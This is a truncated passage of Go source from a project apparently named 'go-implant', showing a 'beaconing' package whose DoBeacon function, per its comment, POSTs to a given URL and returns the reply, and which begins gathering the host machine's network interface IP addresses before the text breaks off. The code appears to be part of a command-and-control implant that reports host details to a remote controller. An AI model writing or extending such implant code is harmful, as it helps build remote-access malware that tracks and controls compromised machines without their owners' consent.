package beaconing

import (
	"go-implant/client/config"
	"go-implant/common/communication"
	"bytes"
	"encoding/json"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"time"
)

// DoBeacon does POST request to url and returns the reply
func DoBeacon(url string) ([]byte, error) {

	if config.DEBUG {
		log.Printf("Beaconing on %s", url)
	}

	// get interfaces on each beacon, they might have changed
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}
	ips := []string{}
	for _, i := range ifaces {
		addrs, err := i.Addrs()
		if err != nil {
			return nil, err
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip =